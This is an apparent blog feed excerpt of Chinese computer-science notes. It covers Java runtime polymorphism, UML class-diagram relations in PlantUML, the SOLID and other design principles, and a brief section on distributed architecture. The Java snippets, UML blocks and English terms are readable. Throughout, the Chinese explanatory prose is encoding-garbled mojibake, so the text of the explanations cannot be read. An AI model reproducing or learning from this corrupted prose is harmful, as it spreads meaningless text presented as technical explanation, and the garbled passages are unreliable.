<p>è¿è¡Œæ—¶å¤šæ€æœ‰ä¸‰ä¸ªæ¡ä»¶ï¼š</p>
<ul>
<li>ç»§æ‰¿</li>
<li>è¦†ç›–ï¼ˆé‡å†™ï¼‰</li>
<li>å‘ä¸Šè½¬å‹</li>
</ul>
<p>ä¸‹é¢çš„ä»£ç ä¸­ï¼Œä¹å™¨ç±»ï¼ˆInstrumentï¼‰æœ‰ä¸¤ä¸ªå­ç±»ï¼šWind å’Œ Percussionï¼Œå®ƒä»¬éƒ½è¦†ç›–äº†çˆ¶ç±»çš„ play() æ–¹æ³•ï¼Œå¹¶ä¸”åœ¨ main() æ–¹æ³•ä¸­ä½¿ç”¨çˆ¶ç±» Instrument æ¥å¼•ç”¨ Wind å’Œ Percussion å¯¹è±¡ã€‚åœ¨ Instrument å¼•ç”¨è°ƒç”¨ play() æ–¹æ³•æ—¶ï¼Œä¼šæ‰§è¡Œå®é™…å¼•ç”¨å¯¹è±¡æ‰€åœ¨ç±»çš„ play() æ–¹æ³•ï¼Œè€Œä¸æ˜¯ Instrument ç±»çš„æ–¹æ³•ã€‚</p>
<div><pre><code><span>public</span> <span>class</span> <span>Instrument</span> <span>{</span>

    <span>public</span> <span>void</span> <span>play</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Instument is playing..."</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Wind</span> <span>extends</span> <span>Instrument</span> <span>{</span>

    <span>public</span> <span>void</span> <span>play</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Wind is playing..."</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Percussion</span> <span>extends</span> <span>Instrument</span> <span>{</span>

    <span>public</span> <span>void</span> <span>play</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Percussion is playing..."</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Music</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>List</span><span><span>&lt;</span><span>Instrument</span><span>></span></span> instruments <span>=</span> <span>new</span> <span>ArrayList</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>
        instruments<span>.</span><span>add</span><span>(</span><span>new</span> <span>Wind</span><span>(</span><span>)</span><span>)</span><span>;</span>
        instruments<span>.</span><span>add</span><span>(</span><span>new</span> <span>Percussion</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>for</span><span>(</span><span>Instrument</span> instrument <span>:</span> instruments<span>)</span> <span>{</span>
            instrument<span>.</span><span>play</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code>Wind is playing...
Percussion is playing...
</code></pre></div><h1 id="äºŒã€ç±»å›¾" tabindex="-1"> äºŒã€ç±»å›¾</h1>
<p>ä»¥ä¸‹ç±»å›¾ä½¿ç”¨ <a href="https://www.planttext.com/" target="_blank" rel="noopener noreferrer">PlantUML</a> ç»˜åˆ¶ï¼Œæ›´å¤šè¯­æ³•åŠä½¿ç”¨è¯·å‚è€ƒï¼šhttp://plantuml.com/ ã€‚</p>
<h2 id="æ³›åŒ–å…³ç³»-generalization" tabindex="-1"> æ³›åŒ–å…³ç³» (Generalization)</h2>
<p>ç”¨æ¥æè¿°ç»§æ‰¿å…³ç³»ï¼Œåœ¨ Java ä¸­ä½¿ç”¨ extends å…³é”®å­—ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c0874e0a-dba3-467e-9c86-dd9313e0843e.jpg" width="180px"> </div><br>
<div><pre><code>@startuml

title Generalization

class Vihical
class Car
class Trunck

Vihical &lt;|-- Car
Vihical &lt;|-- Trunck

@enduml
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="å®ç°å…³ç³»-realization" tabindex="-1"> å®ç°å…³ç³» (Realization)</h2>
<p>ç”¨æ¥å®ç°ä¸€ä¸ªæ¥å£ï¼Œåœ¨ Java ä¸­ä½¿ç”¨ implements å…³é”®å­—ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/83d466bd-946b-4430-854a-cf7b0696d4c8.jpg" width="170px"> </div><br>
<div><pre><code>@startuml

title Realization

interface MoveBehavior
class Fly
class Run

MoveBehavior &lt;|.. Fly
MoveBehavior &lt;|.. Run

@enduml
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="èšåˆå…³ç³»-aggregation" tabindex="-1"> èšåˆå…³ç³» (Aggregation)</h2>
<p>è¡¨ç¤ºæ•´ä½“ç”±éƒ¨åˆ†ç»„æˆï¼Œä½†æ˜¯æ•´ä½“å’Œéƒ¨åˆ†ä¸æ˜¯å¼ºä¾èµ–çš„ï¼Œæ•´ä½“ä¸å­˜åœ¨äº†éƒ¨åˆ†è¿˜æ˜¯ä¼šå­˜åœ¨ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a0ce43b7-afa8-4397-a96e-5c12a070f2ae.jpg" width="300px"> </div><br>
<div><pre><code>@startuml

title Aggregation

class Computer
class Keyboard
class Mouse
class Screen

Computer o-- Keyboard
Computer o-- Mouse
Computer o-- Screen

@enduml
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><h2 id="ç»„åˆå…³ç³»-composition" tabindex="-1"> ç»„åˆå…³ç³» (Composition)</h2>
<p>å’Œèšåˆä¸åŒï¼Œç»„åˆä¸­æ•´ä½“å’Œéƒ¨åˆ†æ˜¯å¼ºä¾èµ–çš„ï¼Œæ•´ä½“ä¸å­˜åœ¨äº†éƒ¨åˆ†ä¹Ÿä¸å­˜åœ¨äº†ã€‚æ¯”å¦‚å…¬å¸å’Œéƒ¨é—¨ï¼Œå…¬å¸æ²¡äº†éƒ¨é—¨å°±ä¸å­˜åœ¨äº†ã€‚ä½†æ˜¯å…¬å¸å’Œå‘˜å·¥å°±å±äºèšåˆå…³ç³»äº†ï¼Œå› ä¸ºå…¬å¸æ²¡äº†å‘˜å·¥è¿˜åœ¨ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6a88a398-c494-41f5-bb62-9f7fb811df7c.jpg" width="280px"> </div><br>
<div><pre><code>@startuml

title Composition

class Company
class DepartmentA
class DepartmentB

Company *-- DepartmentA
Company *-- DepartmentB

@enduml
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="å…³è”å…³ç³»-association" tabindex="-1"> å…³è”å…³ç³» (Association)</h2>
<p>è¡¨ç¤ºä¸åŒç±»å¯¹è±¡ä¹‹é—´æœ‰å…³è”ï¼Œè¿™æ˜¯ä¸€ç§é™æ€å…³ç³»ï¼Œä¸è¿è¡Œè¿‡ç¨‹çš„çŠ¶æ€æ— å…³ï¼Œåœ¨æœ€å¼€å§‹å°±å¯ä»¥ç¡®å®šã€‚å› æ­¤ä¹Ÿå¯ä»¥ç”¨ 1 å¯¹ 1ã€å¤šå¯¹ 1ã€å¤šå¯¹å¤šè¿™ç§å…³è”å…³ç³»æ¥è¡¨ç¤ºã€‚æ¯”å¦‚å­¦ç”Ÿå’Œå­¦æ ¡å°±æ˜¯ä¸€ç§å…³è”å…³ç³»ï¼Œä¸€ä¸ªå­¦æ ¡å¯ä»¥æœ‰å¾ˆå¤šå­¦ç”Ÿï¼Œä½†æ˜¯ä¸€ä¸ªå­¦ç”Ÿåªå±äºä¸€ä¸ªå­¦æ ¡ï¼Œå› æ­¤è¿™æ˜¯ä¸€ç§å¤šå¯¹ä¸€çš„å…³ç³»ï¼Œåœ¨è¿è¡Œå¼€å§‹ä¹‹å‰å°±å¯ä»¥ç¡®å®šã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a3e4dc62-0da5-4d22-94f2-140078281812.jpg" width="200px"> </div><br>
<div><pre><code>@startuml

title Association

class School
class Student

School "1" - "n" Student

@enduml
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h2 id="ä¾èµ–å…³ç³»-dependency" tabindex="-1"> ä¾èµ–å…³ç³» (Dependency)</h2>
<p>å’Œå…³è”å…³ç³»ä¸åŒçš„æ˜¯ï¼Œä¾èµ–å…³ç³»æ˜¯åœ¨è¿è¡Œè¿‡ç¨‹ä¸­èµ·ä½œç”¨çš„ã€‚A ç±»å’Œ B ç±»æ˜¯ä¾èµ–å…³ç³»ä¸»è¦æœ‰ä¸‰ç§å½¢å¼ï¼š</p>
<ul>
<li>A ç±»æ˜¯ B ç±»æ–¹æ³•çš„å±€éƒ¨å˜é‡ï¼›</li>
<li>A ç±»æ˜¯ B ç±»æ–¹æ³•å½“ä¸­çš„ä¸€ä¸ªå‚æ•°ï¼›</li>
<li>A ç±»å‘ B ç±»å‘é€æ¶ˆæ¯ï¼Œä»è€Œå½±å“ B ç±»å‘ç”Ÿå˜åŒ–ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/379444c9-f1d1-45cd-b7aa-b0c18427d388.jpg" width="330px"> </div><br>
<div><pre><code>@startuml

title Dependency

class Vihicle {
    move(MoveBehavior)
}

interface MoveBehavior {
    move()
}

note "MoveBehavior.move()" as N

Vihicle ..> MoveBehavior

Vihicle .. N

@enduml
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><h1 id="ä¸‰ã€è®¾è®¡åŸåˆ™" tabindex="-1"> ä¸‰ã€è®¾è®¡åŸåˆ™</h1>
<h2 id="s-o-l-i-d" tabindex="-1"> S.O.L.I.D</h2>
<table>
<thead>
<tr>
<th style="text-align:center">ç®€å†™</th>
<th style="text-align:center">å…¨æ‹¼</th>
<th style="text-align:center">ä¸­æ–‡ç¿»è¯‘</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">SRP</td>
<td style="text-align:center">The Single Responsibility Principle</td>
<td style="text-align:center">å•ä¸€è´£ä»»åŸåˆ™</td>
</tr>
<tr>
<td style="text-align:center">OCP</td>
<td style="text-align:center">The Open Closed Principle</td>
<td style="text-align:center">å¼€æ”¾å°é—­åŸåˆ™</td>
</tr>
<tr>
<td style="text-align:center">LSP</td>
<td style="text-align:center">The Liskov Substitution Principle</td>
<td style="text-align:center">é‡Œæ°æ›¿æ¢åŸåˆ™</td>
</tr>
<tr>
<td style="text-align:center">ISP</td>
<td style="text-align:center">The Interface Segregation Principle</td>
<td style="text-align:center">æ¥å£åˆ†ç¦»åŸåˆ™</td>
</tr>
<tr>
<td style="text-align:center">DIP</td>
<td style="text-align:center">The Dependency Inversion Principle</td>
<td style="text-align:center">ä¾èµ–å€’ç½®åŸåˆ™</td>
</tr>
</tbody>
</table>
<h3 id="_1-å•ä¸€è´£ä»»åŸåˆ™" tabindex="-1"> 1. å•ä¸€è´£ä»»åŸåˆ™</h3>
<blockquote>
<p>ä¿®æ”¹ä¸€ä¸ªç±»çš„åŸå› åº”è¯¥åªæœ‰ä¸€ä¸ªã€‚</p>
</blockquote>
<p>æ¢å¥è¯è¯´å°±æ˜¯è®©ä¸€ä¸ªç±»åªè´Ÿè´£ä¸€ä»¶äº‹ï¼Œå½“è¿™ä¸ªç±»éœ€è¦åšè¿‡å¤šäº‹æƒ…çš„æ—¶å€™ï¼Œå°±éœ€è¦åˆ†è§£è¿™ä¸ªç±»ã€‚</p>
<p>å¦‚æœä¸€ä¸ªç±»æ‰¿æ‹…çš„èŒè´£è¿‡å¤šï¼Œå°±ç­‰äºæŠŠè¿™äº›èŒè´£è€¦åˆåœ¨äº†ä¸€èµ·ï¼Œä¸€ä¸ªèŒè´£çš„å˜åŒ–å¯èƒ½ä¼šå‰Šå¼±è¿™ä¸ªç±»å®Œæˆå…¶å®ƒèŒè´£çš„èƒ½åŠ›ã€‚</p>
<h3 id="_2-å¼€æ”¾å°é—­åŸåˆ™" tabindex="-1"> 2. å¼€æ”¾å°é—­åŸåˆ™</h3>
<blockquote>
<p>ç±»åº”è¯¥å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚</p>
</blockquote>
<p>æ‰©å±•å°±æ˜¯æ·»åŠ æ–°åŠŸèƒ½çš„æ„æ€ï¼Œå› æ­¤è¯¥åŸåˆ™è¦æ±‚åœ¨æ·»åŠ æ–°åŠŸèƒ½æ—¶ä¸éœ€è¦ä¿®æ”¹ä»£ç ã€‚</p>
<p>ç¬¦åˆå¼€é—­åŸåˆ™æœ€å…¸å‹çš„è®¾è®¡æ¨¡å¼æ˜¯è£…é¥°è€…æ¨¡å¼ï¼Œå®ƒå¯ä»¥åŠ¨æ€åœ°å°†è´£ä»»é™„åŠ åˆ°å¯¹è±¡ä¸Šï¼Œè€Œä¸ç”¨å»ä¿®æ”¹ç±»çš„ä»£ç ã€‚</p>
<h3 id="_3-é‡Œæ°æ›¿æ¢åŸåˆ™" tabindex="-1"> 3. é‡Œæ°æ›¿æ¢åŸåˆ™</h3>
<blockquote>
<p>å­ç±»å¯¹è±¡å¿…é¡»èƒ½å¤Ÿæ›¿æ¢æ‰æ‰€æœ‰çˆ¶ç±»å¯¹è±¡ã€‚</p>
</blockquote>
<p>ç»§æ‰¿æ˜¯ä¸€ç§ IS-A å…³ç³»ï¼Œå­ç±»éœ€è¦èƒ½å¤Ÿå½“æˆçˆ¶ç±»æ¥ä½¿ç”¨ï¼Œå¹¶ä¸”éœ€è¦æ¯”çˆ¶ç±»æ›´ç‰¹æ®Šã€‚</p>
<p>å¦‚æœä¸æ»¡è¶³è¿™ä¸ªåŸåˆ™ï¼Œé‚£ä¹ˆå„ä¸ªå­ç±»çš„è¡Œä¸ºä¸Šå°±ä¼šæœ‰å¾ˆå¤§å·®å¼‚ï¼Œå¢åŠ ç»§æ‰¿ä½“ç³»çš„å¤æ‚åº¦ã€‚</p>
<h3 id="_4-æ¥å£åˆ†ç¦»åŸåˆ™" tabindex="-1"> 4. æ¥å£åˆ†ç¦»åŸåˆ™</h3>
<blockquote>
<p>ä¸åº”è¯¥å¼ºè¿«å®¢æˆ·ä¾èµ–äºå®ƒä»¬ä¸ç”¨çš„æ–¹æ³•ã€‚</p>
</blockquote>
<p>å› æ­¤ä½¿ç”¨å¤šä¸ªä¸“é—¨çš„æ¥å£æ¯”ä½¿ç”¨å•ä¸€çš„æ€»æ¥å£è¦å¥½ã€‚</p>
<h3 id="_5-ä¾èµ–å€’ç½®åŸåˆ™" tabindex="-1"> 5. ä¾èµ–å€’ç½®åŸåˆ™</h3>
<blockquote>
<p>é«˜å±‚æ¨¡å—ä¸åº”è¯¥ä¾èµ–äºä½å±‚æ¨¡å—ï¼ŒäºŒè€…éƒ½åº”è¯¥ä¾èµ–äºæŠ½è±¡ï¼›æŠ½è±¡ä¸åº”è¯¥ä¾èµ–äºç»†èŠ‚ï¼Œç»†èŠ‚åº”è¯¥ä¾èµ–äºæŠ½è±¡ã€‚</p>
</blockquote>
<p>é«˜å±‚æ¨¡å—åŒ…å«ä¸€ä¸ªåº”ç”¨ç¨‹åºä¸­é‡è¦çš„ç­–ç•¥é€‰æ‹©å’Œä¸šåŠ¡æ¨¡å—ï¼Œå¦‚æœé«˜å±‚æ¨¡å—ä¾èµ–äºä½å±‚æ¨¡å—ï¼Œé‚£ä¹ˆä½å±‚æ¨¡å—çš„æ”¹åŠ¨å°±ä¼šç›´æ¥å½±å“åˆ°é«˜å±‚æ¨¡å—ï¼Œä»è€Œè¿«ä½¿é«˜å±‚æ¨¡å—ä¹Ÿéœ€è¦æ”¹åŠ¨ã€‚</p>
<p>ä¾èµ–äºæŠ½è±¡æ„å‘³ç€ï¼š</p>
<ul>
<li>ä»»ä½•å˜é‡éƒ½ä¸åº”è¯¥æŒæœ‰ä¸€ä¸ªæŒ‡å‘å…·ä½“ç±»çš„æŒ‡é’ˆæˆ–è€…å¼•ç”¨ï¼›</li>
<li>ä»»ä½•ç±»éƒ½ä¸åº”è¯¥ä»å…·ä½“ç±»æ´¾ç”Ÿï¼›</li>
<li>ä»»ä½•æ–¹æ³•éƒ½ä¸åº”è¯¥è¦†å†™å®ƒçš„ä»»ä½•åŸºç±»ä¸­çš„å·²ç»å®ç°çš„æ–¹æ³•ã€‚</li>
</ul>
<h2 id="å…¶ä»–å¸¸è§åŸåˆ™" tabindex="-1"> å…¶ä»–å¸¸è§åŸåˆ™</h2>
<p>é™¤äº†ä¸Šè¿°çš„ç»å…¸åŸåˆ™ï¼Œåœ¨å®é™…å¼€å‘ä¸­è¿˜æœ‰ä¸‹é¢è¿™äº›å¸¸è§çš„è®¾è®¡åŸåˆ™ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">ç®€å†™</th>
<th style="text-align:center">å…¨æ‹¼</th>
<th style="text-align:center">ä¸­æ–‡ç¿»è¯‘</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">LOD</td>
<td style="text-align:center">The Law of Demeter</td>
<td style="text-align:center">è¿ªç±³ç‰¹æ³•åˆ™</td>
</tr>
<tr>
<td style="text-align:center">CRP</td>
<td style="text-align:center">The Composite Reuse Principle</td>
<td style="text-align:center">åˆæˆå¤ç”¨åŸåˆ™</td>
</tr>
<tr>
<td style="text-align:center">CCP</td>
<td style="text-align:center">The Common Closure Principle</td>
<td style="text-align:center">å…±åŒå°é—­åŸåˆ™</td>
</tr>
<tr>
<td style="text-align:center">SAP</td>
<td style="text-align:center">The Stable Abstractions Principle</td>
<td style="text-align:center">ç¨³å®šæŠ½è±¡åŸåˆ™</td>
</tr>
<tr>
<td style="text-align:center">SDP</td>
<td style="text-align:center">The Stable Dependencies Principle</td>
<td style="text-align:center">ç¨³å®šä¾èµ–åŸåˆ™</td>
</tr>
</tbody>
</table>
<h3 id="_1-è¿ªç±³ç‰¹æ³•åˆ™" tabindex="-1"> 1. è¿ªç±³ç‰¹æ³•åˆ™</h3>
<p>è¿ªç±³ç‰¹æ³•åˆ™åˆå«ä½œæœ€å°‘çŸ¥è¯†åŸåˆ™ï¼ˆLeast Knowledge Principleï¼Œç®€å†™ LKPï¼‰ï¼Œå°±æ˜¯è¯´ä¸€ä¸ªå¯¹è±¡åº”å½“å¯¹å…¶ä»–å¯¹è±¡æœ‰å°½å¯èƒ½å°‘çš„äº†è§£ï¼Œä¸å’Œé™Œç”Ÿäººè¯´è¯ã€‚</p>
<h3 id="_2-åˆæˆå¤ç”¨åŸåˆ™" tabindex="-1"> 2. åˆæˆå¤ç”¨åŸåˆ™</h3>
<p>å°½é‡ä½¿ç”¨å¯¹è±¡ç»„åˆï¼Œè€Œä¸æ˜¯é€šè¿‡ç»§æ‰¿æ¥è¾¾åˆ°å¤ç”¨çš„ç›®çš„ã€‚</p>
<h3 id="_3-å…±åŒå°é—­åŸåˆ™" tabindex="-1"> 3. å…±åŒå°é—­åŸåˆ™</h3>
<p>ä¸€èµ·ä¿®æ”¹çš„ç±»ï¼Œåº”è¯¥ç»„åˆåœ¨ä¸€èµ·ï¼ˆåŒä¸€ä¸ªåŒ…é‡Œï¼‰ã€‚å¦‚æœå¿…é¡»ä¿®æ”¹åº”ç”¨ç¨‹åºé‡Œçš„ä»£ç ï¼Œæˆ‘ä»¬å¸Œæœ›æ‰€æœ‰çš„ä¿®æ”¹éƒ½å‘ç”Ÿåœ¨ä¸€ä¸ªåŒ…é‡Œï¼ˆä¿®æ”¹å…³é—­ï¼‰ï¼Œè€Œä¸æ˜¯éå¸ƒåœ¨å¾ˆå¤šåŒ…é‡Œã€‚</p>
<h3 id="_4-ç¨³å®šæŠ½è±¡åŸåˆ™" tabindex="-1"> 4. ç¨³å®šæŠ½è±¡åŸåˆ™</h3>
<p>æœ€ç¨³å®šçš„åŒ…åº”è¯¥æ˜¯æœ€æŠ½è±¡çš„åŒ…ï¼Œä¸ç¨³å®šçš„åŒ…åº”è¯¥æ˜¯å…·ä½“çš„åŒ…ï¼Œå³åŒ…çš„æŠ½è±¡ç¨‹åº¦è·Ÿå®ƒçš„ç¨³å®šæ€§æˆæ­£æ¯”ã€‚</p>
<h3 id="_5-ç¨³å®šä¾èµ–åŸåˆ™" tabindex="-1"> 5. ç¨³å®šä¾èµ–åŸåˆ™</h3>
<p>åŒ…ä¹‹é—´çš„ä¾èµ–å…³ç³»éƒ½åº”è¯¥æ˜¯ç¨³å®šæ–¹å‘ä¾èµ–çš„ï¼ŒåŒ…è¦ä¾èµ–çš„åŒ…è¦æ¯”è‡ªå·±æ›´å…·æœ‰ç¨³å®šæ€§ã€‚</p>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>Java ç¼–ç¨‹æ€æƒ³</li>
<li>æ•æ·è½¯ä»¶å¼€å‘ï¼šåŸåˆ™ã€æ¨¡å¼ä¸å®è·µ</li>
<li><a href="http://www.cnblogs.com/shanyou/archive/2009/09/21/1570716.html" target="_blank" rel="noopener noreferrer">é¢å‘å¯¹è±¡è®¾è®¡çš„ SOLID åŸåˆ™</a></li>
<li><a href="http://design-patterns.readthedocs.io/zh_CN/latest/read_uml.html#generalization" target="_blank" rel="noopener noreferrer">çœ‹æ‡‚ UML ç±»å›¾å’Œæ—¶åºå›¾</a></li>
<li><a href="http://www.cnblogs.com/wolf-sun/p/UML-Sequence-diagram.html" target="_blank" rel="noopener noreferrer">UML ç³»åˆ—â€”â€”æ—¶åºå›¾ï¼ˆé¡ºåºå›¾ï¼‰sequence diagram</a></li>
<li><a href="http://blog.csdn.net/jianyuerensheng/article/details/51602015" target="_blank" rel="noopener noreferrer">é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸‰å¤§ç‰¹æ€§ ------ å°è£…ã€ç»§æ‰¿ã€å¤šæ€</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸­é—´ä»¶</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">åˆ†å¸ƒå¼æ¶æ„</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
</ul>

<h1 id="åˆ†å¸ƒå¼æ¶æ„" tabindex="-1"> åˆ†å¸ƒå¼æ¶æ„</h1>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œç›¸å¯¹äºå•æœºæ¶æ„ç³»ç»Ÿï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿå¯ä»¥ä»ä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢è·å¾—æ”¶ç›Šå’Œå¢å¼ºï¼š</p>
<p>1.æ‰©å±•æ€§
è¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿå¯¹æ‰€è¦å¤„ç†çš„æŒç»­å¢é•¿çš„ä»»åŠ¡çš„é€‚åº”èƒ½åŠ›å’Œå…¼å®¹èƒ½åŠ›ï¼Œå¯ç”¨ä»¥ä¸‹ä¸‰ç§æ‰©å±•æ€§æ¥æ¦‚æ‹¬ï¼š1ï¼‰é›†ç¾¤è§„æ¨¡æ‰©å±•æ€§ï¼šæ•´ä½“æœåŠ¡æ€§èƒ½å¯ä»¥éšé›†ç¾¤æœºå™¨æ•°é‡çº¿æ€§å¢é•¿ï¼›2ï¼‰åœ°ç†æ‰©å±•æ€§ï¼šèƒ½å¤Ÿä½¿ç”¨ä¸åŒåœ°åŒºçš„æ•°æ®ä¸­å¿ƒä»¥æŠµæ¶ˆåœ°ç†å› ç´ å¸¦æ¥çš„å»¶è¿Ÿï¼›3ï¼‰ç®¡ç†æ‰©å±•æ€§ï¼šé›†ç¾¤æ•°é‡çš„ä¸Šå‡ä¸ä¼šå¯¼è‡´ç®¡ç†å¤æ‚åº¦å¿«é€Ÿä¸Šå‡ã€‚</p>
<p>2.æ€§èƒ½
æ‰€è°“çš„æ€§èƒ½ä¼˜è‰¯çš„ç³»ç»Ÿåº”è¯¥å…·å¤‡ä¸‰ä¸ªç‰¹è´¨ï¼šçŸ­RTã€ä½å»¶è¿Ÿï¼Œé«˜ååå’Œè¾ƒä½çš„è®¡ç®—èµ„æºå ç”¨ç‡ã€‚</p>
<p>è¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯å»¶è¿Ÿå’Œååã€‚å»¶è¿Ÿlantencyè‹±è¯­æœ¬æ„æ˜¯æ½œä¼æœŸï¼Œåœ¨åˆ†å¸ƒå¼é¢†åŸŸä¸­æè¿°çš„æ˜¯ â€˜ä»äº‹ä»¶å‘ç”Ÿåˆ° å¯è¢«è§‚æµ‹åˆ°â€™ ä¹‹é—´çš„æ—¶é—´é—´éš”ã€‚æ•°æ®ä»å¼€å§‹è¢«å†™å…¥ï¼Œåˆ°ç£ç›˜æŒä¹…åŒ–æˆåŠŸï¼ŒèŠ±äº†100msï¼Œä½†æ˜¯è¿™æœŸé—´æ²¡æœ‰ä»»ä½•ç¬¬ä¸‰æ–¹èƒ½å¤Ÿè§‚å¯Ÿåˆ°æ­¤æ¬¡å†™å…¥çš„å˜æ›´ç»“æœï¼Œå†è¿‡äº†100msï¼Œç»ˆäºæœ‰ç¬¬ä¸‰æ–¹èƒ½å¤Ÿè§‚å¯Ÿåˆ°æ­¤æ¬¡å†™å…¥çš„æœ€æ–°ç»“æœã€‚è¿™é‡Œçš„â€å»¶è¿Ÿâ€œ ä¸º  200msï¼Œè€Œé100msã€‚ ååå¯ä»¥ç®€å•ç†è§£ä¸ºå•ä½æ—¶é—´å†…æœ€å¤šèƒ½å¤„ç†è¯·æ±‚æ•°é‡ã€‚</p>
<p>3.å¯ç”¨æ€§
å¯ç”¨æ€§=å¯ç”¨æ—¶é—´/(å¯ç”¨æ—¶é—´+ä¸å¯ç”¨æ—¶é—´)ï¼Œå¯ç”¨æ€§ç™¾åˆ†æ¯”è¶Šé«˜ï¼Œéš¾åº¦è¶Šé«˜ ã€‚æå‡ç³»ç»Ÿå¯ç”¨æ€§çš„å…³é”®ä¸€ç‚¹ï¼šåœ¨è®¾è®¡é˜¶æ®µå°±éœ€è¦è€ƒè™‘å®¹é”™æ€§(Fault  tolerance) ï¼Œå³â€œé¢å‘å¤±è´¥çš„è®¾è®¡â€ã€‚é‚£ä¹ˆå¦‚ä½•æŠŠä¸€ä¸ªå•ç³»ç»Ÿåº”ç”¨å¿«é€Ÿæ”¹é€ æˆåˆ†å¸ƒå¼åº”ç”¨å‘¢ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘å¦‚ä½•æä¾›åˆ†å¸ƒå¼çš„æœåŠ¡ï¼Œå¦‚ä½•ç”¨åˆ†å¸ƒå¼ç¼“å­˜ï¼Œåˆ†å¸ƒå¼æ•°æ®åº“ç­‰ç­‰ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-31-00.png" alt="" loading="lazy"></p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆ</title>
